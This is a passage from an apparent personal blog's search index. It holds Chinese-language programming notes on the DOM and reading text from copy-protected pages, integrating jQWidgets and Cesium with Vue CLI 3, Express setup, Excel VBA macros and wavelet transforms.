    <content type="text"><![CDATA[最近要写一些八股文，上网一搜，好多范例，正想下载下来借鉴以下，可惜不让复制粘贴。不过难不倒我，直接使用文档对象模型(Document Object Model，DOM)提供编程接口，将整篇文章下来。 DOM概述DOM简介文档对象模型 (DOM) 是HTML和XML文档的编程接口。它提供了对文档的结构化的表述，并定义了一种方式可以使从程序中对该结构进行访问，从而改变文档的结构，样式和内容。DOM 将文档解析为一个由节点和对象（包含属性和方法的对象）组成的结构集合。简言之，它会将web页面和脚本或程序语言连接起来。 一个web页面是一个文档。这个文档可以在浏览器窗口或作为HTML源码显示出来。但上述两个情况中都是同一份文档。文档对象模型（DOM）提供了对同一份文档的另一种表现，存储和操作的方式。 DOM是web页面的完全的面向对象表述，它能够使用如 JavaScript等脚本语言进行修改。 DOM 和 JavaScript开始的时候，JavaScript和DOM是交织在一起的，但它们最终演变成了两个独立的实体。JavaScript可以访问和操作存储在DOM中的内容，因此我们可以写成这个近似的等式： 1API (web 或 XML 页面) = DOM + JS (脚本语言) DOM 被设计成与特定编程语言相独立，使文档的结构化表述可以通过单一，一致的API获得。尽管通常使用JavaScript操作DOM， 但DOM 也可以使用其他的语言来实现。 DOM访问在使用DOM时，您不需要做任何其他特殊的操作。不同的浏览器都有对DOM不同的实现， 这些实现对当前的DOM标准而言，都会呈现出不同程度的一致性，每个web浏览器都会使用一些文档对象模型，从而使页面可以被脚本语言访问。 当您在创建一个脚本时-无论是使用内嵌 \元素或者使用在web页面脚本加载的方法— 您都可以使用 document或 window 元素的API来操作文档本身或获取文档的子类（web页面中的各种元素）。 您的DOM编程代码可能会像下面例子一样非常简单，如使用 window对象的alert()函数显示一个警告信息，或者使用比较复杂的方法来创建一个新的内容，如下面内容较长的实例所示。 1&lt;body onload=&quot;window.alert(&apos;welcome to my home page!&apos;);&quot;&gt; 重要的数据类型为简单起见，在API参考文档中的语法实例通常会使用element(s) 指代节点，使用nodeList（s）或 element(s)来指代节点数组，使用 attribute(s)来指代属性节点。 数据类型 解释 document 当一个成员返回 document 对象 （例如，元素的 ownerDocument 属性返回它所属于 document ) ，这个对象就是root document 对象本身。 DOM document Reference 一章对 document 对象进行了描述。 element element 是指由 DOM API 中成员返回的类型为 element 的一个元素或节点。 例如， document.createElement() 方法会返回一个 node 的对象引用，也就是说这个方法返回了在DOM中创建的 element。 element 对象实现了 DOM Element 接口以及更基本的 Node 接口，参考文档将两者都包含在内。 nodeList nodeList 是一个元素的数组，如从 document.getElementsByTagName() 方法返回的就是这种类型。 nodeList 中的条目由通过下标有两种方式进行访问：list.item(1)和list[1]。两种方式是等价的，第一种方式中 item() 是 nodeList 对象中的单独方法。 后面的方式则使用了经典的数组语法来获取列表中的第二个条目。 attribute 当 attribute 通过成员函数 (例如，通过 createAttribute()方法) 返回时，它是一个为属性暴露出专门接口的对象引用。DOM中的属性也是节点，就像元素一样，只不过您可能会很少使用它。 namedNodeMap namedNodeMap 和数组类似，但是条目是由name或index访问的，虽然后一种方式仅仅是为了枚举方便，因为在 list 中本来就没有特定的顺序。 出于这个目的， namedNodeMap 有一个 item() 方法，你也可以从 namedNodeMap 添加或移除条目。 DOM 的最小组成单位叫做节点（node）。文档的树形结构（DOM 树），就是由各种不同类型的节点组成。每个节点可以看作是文档树的一片叶子。 节点的类型有七种。 Document：整个文档树的顶层节点 DocumentType：doctype标签（比如\&lt;!DOCTYPE html>） Element：网页的各种HTML标签（比如\、\等） Attribute：网页元素的属性（比如class=”right”） Text：标签之间或标签包含的文本 Comment：注释 DocumentFragment：文档的片段 浏览器提供一个原生的节点对象Node，上面这七种节点都继承了Node，因此具有一些共同的属性和方法。 DOM中核心接口在DOM编程时，通常使用的最多的就是 Document 和 window 对象。简单的说， window 对象表示浏览器中的内容，而 document 对象是文档本身的根节点。Element 继承了通用的 Node 接口, 将这两个接口结合后就提供了许多方法和属性可以供单个元素使用。在处理这些元素所对应的不同类型的数据时，这些元素可能会有专用的接口，如上节中的 table 对象的例子。 下面是在web和XML页面脚本中使用DOM时，一些常用的API简要列表。 document.getElementById(id) document.getElementsByTagName(name) document.createElement(name) parentNode.appendChild(node) element.innerHTML element.style.left element.setAttribute() element.getAttribute() element.addEventListener() window.content window.onload window.dump() window.scrollTo() 文档下载实战以示例范文为例，提取其中内容。 禁止复制粘贴的原理 阻止默认的事件响应 123456789101112&lt;script type=&quot;text/javascript&quot;&gt;// 禁止右键菜单document.oncontextmenu = function()&#123; return false; &#125;;// 禁止文字选择document.onselectstart = function()&#123; return false; &#125;;// 禁止复制document.oncopy = function()&#123; return false; &#125;;// 禁止剪切document.oncut = function()&#123; return false; &#125;;// 禁止粘贴document.onpaste = function()&#123; return false; &#125;;&lt;/script&gt; CSS阻止用户选择 123element.style &#123; user-select: none;&#125; 破解禁止复制粘贴使用chrome打开该网页，在使用快捷键ctrl+shift+i，打开开发者工具，找到文档节点DIV的id为article，使用如下代码提取文章内容： 12var node=document.getElementById(&apos;article&apos;)console.log(node.innerText) 参考链接 DOM 模型概述,by 阮一峰. DOM概述,by MDN web DOC. 网页上如何实现禁止复制粘贴以及如何破解,by 小茗同学.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue-cli-3集成jQWidgets]]></title>
    <url>%2F2019%2F07%2F19%2FVue-cli-3%E9%9B%86%E6%88%90jQWidgets%2F</url>
    <content type="text"><![CDATA[jQWidgets是一个软件框架，包含小部件，主题，输入验证，拖放插件，数据适配器，内置WAI-ARIA可访问性，国际化和MVVM支持。它建立在开放标准和技术HTML5，CSS，JavaScript和jQuery之上。该库用于开发响应式Web和移动应用程序。下面介绍在Vuejs中集成jQWidgets。 安装环境 node.js: v10.16.0 npm: 6.9.0 vue: 2.6.10 cesium: 1.45.0 vue-cli: 3.9.2 webpack: 4.28.4 安装步骤 安装vue-cli 1npm install -g @vue/cli 创建应用 1vue create jqwidgets-vue-cli-app //Choose the default preset 导航到应用 1cd jqwidgets-vue-cli-app 安装jQWidgets依赖 1npm install jqwidgets-scripts --save--dev 从node_modules/jqwidgets-scripts/jqwidgets复制styles文件夹到public文件夹。 在index.html链接 jqx.base.css 文件。 1&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./styles/jqx.base.css&quot; /&gt; 修改App.vue如下： 1234567891011121314151617181920212223242526&lt;template&gt; &lt;JqxBarGauge ref=&quot;barGaugeReference&quot; :width=&quot;600&quot; :height=&quot;600&quot; :values=&quot;values&quot; :formatFunction=&quot;formatFunction&quot; /&gt;&lt;/template&gt; &lt;script&gt; import JqxBarGauge from &apos;jqwidgets-scripts/jqwidgets-vue/vue_jqxbargauge.vue&apos;; export default &#123; components: &#123; JqxBarGauge &#125;, data: function () &#123; return &#123; values: [10, 20, 30, 40, 50] &#125; &#125;, methods: &#123; formatFunction: function (value, index, color) &#123; return color; &#125; &#125; &#125;&lt;/script&gt; 运行Vue Cli开发服务器 1npm run serve 在浏览器中输入 localhost:8080 查看结果。 参考链接 Vue CLI with jQWidgets,by jQWidgets.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue-cli 3集成Cesium]]></title>
    <url>%2F2019%2F07%2F18%2FVue-cli-3%E9%9B%86%E6%88%90Cesium%2F</url>
    <content type="text"><![CDATA[之前记录了在Vue-Cli 2的基础上集成了Cesium，但现在Vue-Cli已更新到3，之前方法已不适用。在参考Vue-cli 3.0 + cesium 构建的基础上，验证记录Vue-Cli 3脚手架工具中集成Cesium的过程。 安装环境 node.js: v10.16.0 npm: 6.9.0 vue: 2.6.10 cesium: 1.45.0 vue-cli: 3.9.2 webpack: 4.28.4 安装配置 安装nodejs 安装vue-cli脚手架 1234npm install -g @vue/clivue create my-projectcd my-projectnpm run serve 安装 cesium 1npm i cesium --save 新建 vue.config.js 文件，配置内容如下: 123456789101112131415161718192021222324252627282930313233343536373839404142const CopyWebpackPlugin = require(&apos;copy-webpack-plugin&apos;)const webpack = require(&apos;webpack&apos;)const path = require(&apos;path&apos;)const debug = process.env.NODE_ENV !== &apos;production&apos;let cesiumSource = &apos;./node_modules/cesium/Source&apos;let cesiumWorkers = &apos;../Build/Cesium/Workers&apos;module.exports = &#123; baseUrl: &apos;&apos;, devServer: &#123; port: 9999 &#125;, configureWebpack: &#123; output: &#123; sourcePrefix: &apos; &apos; &#125;, amd: &#123; toUrlUndefined: true &#125;, resolve: &#123; alias: &#123; &apos;vue$&apos;: &apos;vue/dist/vue.esm.js&apos;, &apos;@&apos;: path.resolve(&apos;src&apos;), &apos;cesium&apos;: path.resolve(__dirname, cesiumSource) &#125; &#125;, plugins: [ new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, cesiumWorkers), to: &apos;Workers&apos;&#125;]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Assets&apos;), to: &apos;Assets&apos;&#125;]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Widgets&apos;), to: &apos;Widgets&apos;&#125;]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;ThirdParty/Workers&apos;), to: &apos;ThirdParty/Workers&apos;&#125;]), new webpack.DefinePlugin(&#123; CESIUM_BASE_URL: JSON.stringify(&apos;./&apos;) &#125;) ], module: &#123; unknownContextCritical: /^.\/.*$/, unknownContextCritical: false &#125; &#125;&#125; 在 src/components 下新建 CesiumViewer.vue 文件，内容如下: 1234567891011121314151617181920212223&lt;template&gt; &lt;div id=&quot;cesiumContainer&quot; class=&quot;fullSize&quot;&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;CesiumViewer&quot;&#125;&lt;/script&gt;&lt;style scoped&gt;.fullSize &#123; display: block; position: absolute; top: 0; left: 0; border: none; width: 100%; height: 100%;&#125;&lt;/style&gt; 修改 router.js ，引入 CesiumViewer组件，内容如下: 123456789101112131415import Vue from &apos;vue&apos;import Router from &apos;vue-router&apos;import CesiumViewer from &apos;./components/CesiumViewer.vue&apos;Vue.use(Router)export default new Router(&#123; routes: [ &#123; path: &apos;/&apos;, name: &apos;CesiumViewer&apos;, component: CesiumViewer &#125; ]&#125;) 修改App.vue ，内容如下： 12345678910111213141516171819202122&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;router-view/&gt; &lt;/div&gt;&lt;/template&gt;&lt;style lang=&quot;css&quot;&gt; html, body, #cesiumContainer &#123; width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden; &#125; #app &#123; font-family: &apos;Avenir&apos;, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-align: center; color: #2c3e50; &#125;&lt;/style&gt; 最后修改 main.js 内容如下: 123456789101112131415161718import Vue from &apos;vue&apos;import App from &apos;./App.vue&apos;import router from &apos;./router&apos;import store from &apos;./store&apos;import Cesium from &apos;cesium/Cesium&apos;// noinspection ES6UnusedImportsimport widget from &apos;cesium/Widgets/widgets.css&apos;Vue.config.productionTip = falsenew Vue(&#123; router, store, render: h =&gt; h(App), mounted () &#123; var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;) &#125;&#125;).$mount(&apos;#app&apos;) 最后 npm serve ，打开浏览器输入localhost:8080查看效果。 参考链接 Vue-cli 3.0 + cesium 构建,by QingMings. cesium-and-webpack,by marsgis. Vue.js集成Cesium,by jack huang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js开发入门简易教程]]></title>
    <url>%2F2019%2F07%2F18%2FVue-js%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Vue.js（/vjuː/，或简称为Vue）是一个用于创建用户界面的开源JavaScript框架，也是一个创建单页应用的Web应用框架。Vue与React、Angular一起成为当前三大最流行的Web应用框架。下面简单介绍使用Vue CLI脚手架工具创建简单的Web应用。 Vue CLI简介Vue CLI 是一个基于 Vue.js 进行快速开发的完整系统，提供： 通过 @vue/cli 搭建交互式的项目脚手架。 通过 @vue/cli + @vue/cli-service-global 快速开始零配置原型开发。 一个运行时依赖 (@vue/cli-service)，该依赖： 可升级； 基于 webpack 构建，并带有合理的默认配置； 可以通过项目内的配置文件进行配置； 可以通过插件进行扩展。 一个丰富的官方插件集合，集成了前端生态中最好的工具。 一套完全图形化的创建和管理 Vue.js 项目的用户界面。 Vue CLI 致力于将 Vue 生态中的工具基础标准化。它确保了各种构建工具能够基于智能的默认配置即可平稳衔接，这样你可以专注在撰写应用上，而不必花好几天去纠结配置的问题。与此同时，它也为每个工具提供了调整配置的灵活性，无需 eject。 Vue CLI 有几个独立的部分: CLI CLI (@vue/cli) 是一个全局安装的 npm 包，提供了终端里的 vue 命令。它可以通过 vue create 快速创建一个新项目的脚手架，或者直接通过 vue serve 构建新想法的原型。你也可以通过 vue ui 通过一套图形化界面管理你的所有项目。 CLI 服务 CLI 服务 (@vue/cli-service) 是一个开发环境依赖。它是一个 npm 包，局部安装在每个 @vue/cli 创建的项目中。 CLI 服务是构建于 webpack 和 webpack-dev-server 之上的。它包含了： * 加载其它 CLI 插件的核心服务； * 一个针对绝大部分应用优化过的内部的 webpack 配置； * 项目内部的 vue-cli-service 命令，提供 serve、build 和 inspect 命令。 如果你熟悉 create-react-app 的话，@vue/cli-service 实际上大致等价于 react-scripts，尽管功能集合不一样。 CLI 插件 CLI 插件是向你的 Vue 项目提供可选功能的 npm 包，例如 Babel/TypeScript 转译、ESLint 集成、单元测试和 end-to-end 测试等。Vue CLI 插件的名字以 @vue/cli-plugin- (内建插件) 或 vue-cli-plugin- (社区插件) 开头，非常容易使用。 当你在项目内部运行 vue-cli-service 命令时，它会自动解析并加载 package.json 中列出的所有 CLI 插件。 插件可以作为项目创建过程的一部分，或在后期加入到项目中。它们也可以被归成一组可复用的 preset。 Vue CLI安装 Vue CLI 需要 Node.js 8.9 或更高版本 (推荐 8.11.0+)。你可以使用 nvm 或 nvm-windows 在同一台电脑中管理多个 Node 版本。 1npm install -g @vue/cli 安装之后，你就可以在命令行中访问 vue 命令。你可以通过简单运行 vue，看看是否展示出了一份所有可用命令的帮助信息，来验证它是否安装成功。 创建项目运行以下命令来创建一个新项目： 1vue create hello-world 运行项目在一个 Vue CLI 项目中，@vue/cli-service 安装了一个名为 vue-cli-service 的命令。你可以在 npm scripts 中以 vue-cli-service、或者从终端中以 ./node_modules/.bin/vue-cli-service 访问这个命令。 这是你使用默认 preset 的项目的 package.json：123456&#123; &quot;scripts&quot;: &#123; &quot;serve&quot;: &quot;vue-cli-service serve&quot;, &quot;build&quot;: &quot;vue-cli-service build&quot; &#125;&#125; 你可以通过 npm 调用这些 script： 1npm run serve 参考链接 Vue.js,by wikipedia. vue cli,by vuejs homepage.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Expressjs框架的安装使用]]></title>
    <url>%2F2019%2F07%2F18%2FExpressjs%E6%A1%86%E6%9E%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Express是高度包容、快速而极简的 Node.js Web 框架。下面简单介绍Express框架的安装和使用。 安装安装最新Nodejs长期支持版前往nodejs官方网站下载其最新长期支持版，并安装。 安装Express生成器Express生成器是一个脚手架工具，能够快速生成标准的Express Web框架，简化开发过程。具体安装方法如下： 1npm install -g express-generator@4 创建APP： 1$ express /tmp/foo &amp;&amp; cd /tmp/foo 安装依赖： 1npm install 启动Web服务器： 1234# 直接启动npm start# 调试启动SET DEBUG=server:* &amp; npm start 访问网站： http://localhost:3000 参考链接 Express,by Express homepage. Express github,by Express github.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Excel宏编程简易教程]]></title>
    <url>%2F2019%2F07%2F16%2FExcel%E5%AE%8F%E7%BC%96%E7%A8%8B%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[期末了，媳妇计算学生平时成绩好辛苦，于是准备编写Excel宏程序提高媳妇工作的效率，节省时间。于是简单记录Excel宏编程的相关知识。 基本概念为了编写Excel宏，首先需要了解一些基本概念： 工作簿工作簿相关概念有：Workbooks、Workbook、ActiveWorkbook、ThisWorkbook。 Workbooks集合包含excel中所有当前打开的excel工作簿，亦即所有打开的excel文件； Workbook对应Workbooks中的成员，即其中的excel文件； ActiveWorkbook代表当前处于活动状态的工作簿，即当前显示的excel文件； ThisWorkbook代表其中有Visual Basic代码正在运行的工作簿。 在具体使用中可用Workbooks(index)来引用Workbook对象，其中index为工作簿名称或编号，如Workbooks(1)、 Workbooks(“年度报表.xls”)。而编号按照创建或打开工作簿的顺序来确定，第一个打开的工作簿编号为1，第二个打开的工作簿为2……。 工作表工作表相关概念有：Worksheets、Worksheet、ActiveSheet。 Worksheets集合包含工作簿中所有的工作表，即一个excel文件中的所有数据表页； Worksheet则代表其中的一个工作表； ActiveSheet代表当前处于的活动状态工作表，即当前显示的一个工作表。 图表图表相关概念有：Chart 、Charts、ChartObject、ChartObjects、ActiveChart。 Chart代表工作簿中的图表。该图表既可为嵌入式图表（包含在ChartObject中），也可为一个分开的（单独的）图表工作表。 Charts代表指定工作簿或活动工作簿中所有图表工作表的集合，但不包括嵌入式在工作表或对话框编辑表中的图表。使用Charts(index) 可引用单个Chart图表，其中index是该图表工作表的索引号或名称；如Charts(1)、Charts(“销售图表”)。 ChartObject代表工作表中的嵌入式图表，其作用是作为Chart对象的容器。利用ChartObject可以控制工作表上嵌入式图表的外观和尺寸。 ChartObjects代表指定的图表工作表、对话框编辑表或工作表上所有嵌入式图表的集合。 单元格单元格相关概念有：Cells、ActiveCell、Range、Areas。 Cells(row,column)代表单个单元格，其中row为行号，column为列号。如可以用Cells(1,1)、Cells(10,4)来引用”A1”、”D10” 单元格。 ActiveCell代表活动工作表的活动单元格，或指定工作表的活动单元格。 Range代表工作表中的某一单元格、某一行、某一列、某一选定区域（该选定区域可包含一个或若干连续单元格区域）或者某一三维区域。可用Range(arg)来引用单元格或单元格区域，其中arg可为单元格号、单元格号范围、单元格区域名称。如Range(“A5”)、 Range(“A1:H8”)、Range(“Criteria”)。虽然可用Range(“A1”)返回单元格A1，但用Cells更方便，因为此时可 用变量指定行和列。 Areas 为选定区域内的连续单元格块的集合，其成员是Range对象。 行与列行与列相关概念有：Rows、Columns、Row、Column。 Rows、Columns分别代表活动工作表、单元格区域范围Range、指定工作表中的所有行数、列数。 基本语法Visual Basic for Applications（VBA）是一种Visual Basic的一种宏语言，主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件。也可说是一种应用程序视觉化的Basic Sc​​ript。 1994年发行的Excel 5.0版本中，即具备了VBA的宏功能。Excel宏编程主要使用VBA。 数据类型基本数据类型即Primary Type Data，下述列表的括号内为字节数： Byte (1)：无符号类型，取值范围0-255 Boolean (2) Integer (2) Long (4) Single (4) Double (8) Currency (8) Decimal (14) Date (8) String Object (4) Variant （根据分配确定） 自定义的数据类型相当于C语言的struct，例如： 12345Type 自定义类型名 元素名 As 类型 … [元素名 As 类型]End Type 数组1234567891011121314Option Base 0 &apos;數組索引值從0開始Option Base 1 &apos;數組索引值從1開始Dim MyArray(10) &apos;聲明一個數組變量，10是最大的可用的數組索引值MyArray(5) = 101 &apos;給數組的元素賦值Dim Data(10,5) &apos;聲明一個二維數組變量Data(1,1) = &quot;A001&quot; &apos;給數組元素賦值Dim cArr(-11 To 20, 1 To 3) As String &apos;聲明一個數組，定義數組索引值的上下界Dim dArr() As String &apos;聲明動態數組ReDim dArr(0 To 5, 1 To 2) &apos;改變動態數組的尺寸默認把原數據清除。如果保留原來的數據，必須加上參數Preserve。 &apos;使用Preserve參數時只能改變最後一維的大小If UBound(vTemp) = -1 Then &apos;判斷數組變量vTemp是否為 空數組End IfErase MyArrar, Data &apos;Eras​​e語句清除數組元素，釋放變量佔用的空間 常量日期常量由符号“#”将字符括起来，如#2012-1-1#。 系统定义常量有3个：True、False和Null。 固有常量是编程时引用的对象库定义的常量。所有固有常量都可以在宏或VBA代码中使用。通常，固有常量通过前两个字母来指明定义该常量。来自VB库的常量则以“vb”开头。来自Access的常量以“ac”开头。可以使用对象浏览器来查看所有对象库中的固有常量列表。 可以自行定义常量。如： 1Global Const 符号常量名称 = 常量值 控制结构if 语句123456789if 條件1 then 語句1elseif 條件2 then 語句2elseif ... ...else 語句nend if Select Case 语句123456789Select Case 表達式 Case 表達式列表1 語句1 Case 表達式列表2 語句2 ... Case 表達式列表n 語句nEnd Select Do…Loop 语句12345Do While或Until 條件 語句塊1 Exit Do 語句塊2Loop 12345Do 語句塊1 Exit Do 語句塊2Loop While或Until 條件 For…Next语句123For 循環控制變量=初值To 終值Step 步長 語句塊 ‘Exit For語句可以跳出循環體Next For Each … Next语句1234For Each 循環控制變量 In 集合變量 語句塊 Exit For語句可以跳出循環體Next 循環控制變量 跳出本次循环的continue语句VBA没有类似C语言的continue语句。通常可如此写程序： 1234567For 循環控制變量=初值 To 終值 Step 步長 Do &apos;用于模拟continue 語句塊 If 条件 Then Exit Do &apos;用于模拟continue 語句塊 Loop While False &apos;用于模拟continueNext With语句123With 對象引用 語句塊End With On Error语句1On Error Goto 出錯處理語句的label &apos;跳轉到出錯處理語句 或者1On Error Resume Next &apos;遇到錯誤，不管錯誤，繼續往下執行 过程与函数12345Sub 過程名(參數表) 語句塊 Exit Sub 語句塊End Sub 12345Function 函數名(參數表) As Type 語句塊 函數名=表達式 Exit FunctionEnd Function 常用内置函数VBA的常用内置函数列表: MsgBox InputBox 舍入函数：Fix 向0取整,Int向下取整, Round四舍五入 Rnd 返回0-1内的单精度随机数 字符串函数： Filter：对字符串的一维数组的过滤 InStr([Start, ],[, Compare])与InStrRev： 查找子串 Len 字符串长度 Join：连接一维数组中的所有子字符串 Left,Right,Mid 截取子字符串 Space(数值) 生成空格字符串 Ucase,Lcase 大小写转换函数 Ltrim, Rtrim,Trim 删除首尾空格 Replace Split：分割一个字符串成为一维数组 StrComp：字符串比较 StrConv：字符串转换 String(number, character)：制定字符重复若干次 StrReverse 日期/时间有关函数： Year, Month, Day, WeekDay,Hour,Minute,Second 截取日期时间分量 DateAdd 日期/时间增量函数 DateDiff(&lt;间隔类型&gt;,&lt;日期1&gt;,&lt;日期2&gt;[,W1][,W2])日期/时间的距离函数 DatePart(&lt;分割类型&gt;,&lt;日期&gt;[,w1][,w2])时间分割函数 DateSerial(&lt;表达式1&gt;,&lt;表达式2&gt;,&lt;表达式3&gt;) 合成日期；DateValue(“字符串表达式”)返回日期； Date,Time,Now,Timer 返回日期时间 DateValue TimeSerial：由时间序列得到时间对象 TimeValue：由时间字符串得到时间对象 Weekday：获得日期的周几 WeekdayName 转换函数：CBool、CByte、CCur、 CDate、 CDbl、CDec、CInt、 CLng、CLngLng、CLngPtr、CSng、CStr、CVar、CVErr、Asc(&lt;字符串表达式&gt;)返回第一个字符的Ascii编码值、Chr(ASCII码)返回字符、Hex、Oct、Str(&lt;数值表达式&gt;)返回字符串、Val(string)、Format、FormatCurrency、FormatDateTime、FormatNumber、FormatPercent、MonthName Nz(表达式或字段属性值[,规定值])如果是空，则返回0或者””或者函数的第二个参数值 验证函数：isNumeric、isDate、isNull、isEmpty IsArray、IsError、IsMissing、IsObject 数学函数：Abs、Sqr、Tan、Atn（即atan）、Sin、Cos、Exp（e为基的指数）、Log自然对数 Array:构造一个Array对象 CallByName: get or set a property, or invoke a method at run time using a string name. 控制流：Choose:类似于C语言的select语句、IIf相当于IF-ELSE语句、Switch Command：获取命令行参数 CreateObject：创建ActiveX对象 CurDir：返回指定驱动器的当前工作路径 由基本数学函数导出的函数：Sec、Cosec、Cotangent、Cotan、Arcsin、Arccos、Arcsec、Arccosec、Arccotan、HSin、HCos、HTan、HSec、HCosec、HCotan、HArcsin、HArccos、HArctan、HArcsec、HArccosec、HArccotan、LogN DoEvents：暂时把CPU控制权交回给系统。 Environ：返回环境变量的值 文件操作： Dir：返回满足条件的所有文件、目录的名字 EOF FileAttr FileDateTime FileLen FreeFile Function GetAttr：返回文件、目录的属性值 Input：读取文件 Loc：文件指针位置 LOF：文件打开时的指针位置 Seek：文件指针定位 Spc：使用Print做position output Tab：用于Print函数 Error:错误号对应的错误消息 Windows Registry中的数据：GetAllSettings、SaveSetting、DeleteSetting、GetSetting GetObject：ActiveX组建的引用 IMEStatus：返回当前Input Method Editor (IME)。 Macintosh平台：MacID、MacScript 金融函数： DDB：使用double-declining balance计算贬值 FV:计算固定利率的年金 IPmt：计算利率 IRR：计算利率 MIRR：计算利率 NPer：计算周期数 NPV：计算net present value Pmt：计算支付数 PPmt：计算本金支付数 PV：计算present value Rate：利息率 SLN：straight-line depreciation SYD：计算sum-of-years’ digits depreciation Partition：返回字符串，表示一个数值名字落在各个range内。常用于SQL select语句 QBColor：颜色值 RGB：颜色值 TypeName：得到变量的类型名 VarType：得到变量的类型数 表达式比较特殊的运算符有指数运算^，浮点除法/，整数除法\，取模运算Mod，不等逻辑比较运算&lt;&gt; 简单示例在Excel开发工具中点击录制宏，生成一个VBA过程，创建如下代码计算学生平均成绩： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546Sub 计算平均成绩()&apos;&apos; 计算平均成绩 宏&apos; 计算平均成绩&apos;&apos; 快捷键: Ctrl+l&apos; Application.Goto Reference:=&quot;计算平均成绩&quot; Dim count As Integer &apos; 统计学生总数 count = Range(&quot;A1&quot;).CurrentRegion.Rows.count &apos; 统计学生总数 ActiveSheet.Cells(1, &quot;E&quot;).Value = &quot;平均成绩&quot; Dim workSocre As Double &apos; 课程分 Dim videoScore As Double &apos; 视频分 Dim discussScore As Double &apos; 讨论分 For i = 2 To count &apos; 计算学生平均成绩 workSocre = ActiveSheet.Cells(i, &quot;A&quot;).Value videoScore = ActiveSheet.Cells(i, &quot;B&quot;).Value discussScore = Discuss(ActiveSheet.Cells(i, &quot;C&quot;).Value) ActiveSheet.Cells(i, &quot;E&quot;).Value = workSocre * 0.6 + videoScore * 100 * 0.2 + discussScore * 0.2 Next MsgBox (&quot;平均成绩计算完成!&quot;)End SubFunction Discuss(discussCount As Integer) As Integer Dim score As Integer Select Case discussCount Case Is &gt;= 20 score = 100 Case Is &gt;= 15 score = 80 Case Is &gt;= 10 score = 60 Case Is &gt;= 5 score = 40 Case Is &gt; 0 score = 20 Case Is = 0 score = 0 End Select Discuss = scoreEnd Function 参考链接 Excel宏教程 (宏的介绍与基本使用),by 远洪. Visual Basic for Applications,by wikipedia. VBA——Range操作,by 风之工程师.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>语法</tag>
        <tag>VBA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小波变换学习笔记]]></title>
    <url>%2F2019%2F07%2F14%2F%E5%B0%8F%E6%B3%A2%E5%8F%98%E6%8D%A2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[小波分析（英语：wavelet analysis）或小波变换（英语：wavelet transform）是指用有限长或快速衰减的“母小波”（mother wavelet）的振荡波形来表示信号。该波形被缩放和平移以匹配输入的信号。 小波变化的发展，承袭Gabor transform的局部化思想，并且克服了傅里叶和Gabor transform的部分缺陷，小波变换提供了一个可以调变的时频窗口，窗口的宽度(width)随着频率变化，频率增高时，时间窗口的宽度就会变窄，以提高分辨率．小波在整个时间范围内的振幅平均值为0，具有有限的持续时间和突变的频率与震幅，可以是不规则，或不对称的信号。 小波变换分成两个大类：离散小波变换（DWT） 和连续小波变换（CWT）。两者的主要区别在于，连续变换在所有可能的缩放和平移上操作，而离散变换采用所有缩放和平移值的特定子集。 参考链接 能不能通俗的讲解下傅立叶分析和小波分析之间的关系？,by zhihu. 什么是线性平稳信号和非线性非平稳信号？,by zhihu. 形象易懂讲解算法I——小波变换,by 咚懂咚懂咚. 从傅里叶变换进阶到小波变换（一）,by 1335. 信号频域分析方法的理解（频谱、能量谱、功率谱、倒频谱、小波分析）,by Mr.括号. 小波分析,by wikipedia. 傅里叶变换交互式入门,by Jez Swanson.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信号与线性系统学习笔记]]></title>
    <url>%2F2019%2F07%2F05%2F%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%BA%BF%E6%80%A7%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
